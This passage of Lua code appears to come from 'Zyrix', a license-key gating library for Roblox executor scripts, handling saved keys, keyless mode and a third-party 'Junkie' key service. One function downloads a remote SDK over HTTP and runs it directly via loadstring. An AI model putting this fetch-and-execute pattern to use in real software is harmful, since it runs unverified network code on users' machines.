    Internal.ValidateFunction = Zyrix.Callbacks.OnVerify
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        if existingKey == "KEYLESS" or (Internal.ValidateFunction and validateKey(existingKey, Internal.ValidateFunction)) then
            Zyrix:Notify("Executed","Script loaded successfully!",2,"success")
            if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
        end
        getgenv().SCRIPT_KEY = nil
    end
    getgenv().ZyrixClosed = false
    EnsureIconsReady(function()
        if Zyrix.Options.Keyless == true then
            if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Zyrix.Storage.AutoLoad and Internal.ValidateFunction then
            local saved = loadKey()
            if saved and saved ~= "" then
                Zyrix:Notify("Checking","Validating saved key...",2,"shield") task.wait(0.45)
                if validateKey(saved, Internal.ValidateFunction) then
                    getgenv().SCRIPT_KEY = saved
                    Zyrix:Notify("Welcome Back","Key validated!",2,"success")
                    if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
                else
                    clearKey()
                    Zyrix:Notify("Expired","Saved key is no longer valid",3,"warning")
                    task.wait(0.8)
                end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Zyrix:LaunchJunkie(config)
    assert(config and config.Service and config.Identifier and config.Provider, "Config required: Service, Identifier, Provider")
    Internal.IsJunkieMode = true
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        Zyrix:Notify("Executed","Script loaded successfully!",2,"success")
        if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
    end
    getgenv().ZyrixClosed = false
    EnsureIconsReady(function()
        local ok, Junkie = pcall(function() return loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))() end)
        if not ok or not Junkie then Zyrix:Notify("Error","Failed to load Junkie SDK",5,"error") return end
        Junkie.service=config.Service Junkie.identifier=config.Identifier Junkie.provider=config.Provider
        Internal.Junkie = Junkie
        if Zyrix.Links.GetKey == "" then pcall(function() Zyrix.Links.GetKey = Junkie.get_key_link() end) end
        Internal.ValidateFunction = function(key) return Junkie.check_key(key) end
        if Zyrix.Options.Keyless == nil then
            local ks, kr = pcall(function() return Junkie.check_key("KEYLESS") end)
            if ks and kr and kr.valid then
                if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
                BuildKeylessUI() while not getgenv().SCRIPT_KEY do task.wait(0.1) end return
            end
        elseif Zyrix.Options.Keyless == true then
            if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
            BuildKeylessUI() while not getgenv().SCRIPT_KEY do task.wait(0.1) end return
        end
        if Zyrix.Storage.AutoLoad then
            local saved = loadKey()
            if saved and saved ~= "" then
                Zyrix:Notify("Checking","Validating saved key...",2,"shield") task.wait(0.45)
                local vs, vr = pcall(function() return Junkie.check_key(saved) end)
                if vs and vr and vr.valid then
                    getgenv().SCRIPT_KEY = saved
                    Zyrix:Notify("Welcome Back","Key validated!",2,"success")
                    if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
                else
                    clearKey()
                    Zyrix:Notify("Expired","Saved key is no longer valid",3,"warning")
                    task.wait(0.8)
                end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Zyrix:GetSavedKey() return loadKey() end
function Zyrix:ClearSavedKey() return clearKey() end

getgenv().Zyrix = Zyrix
return Zyrix
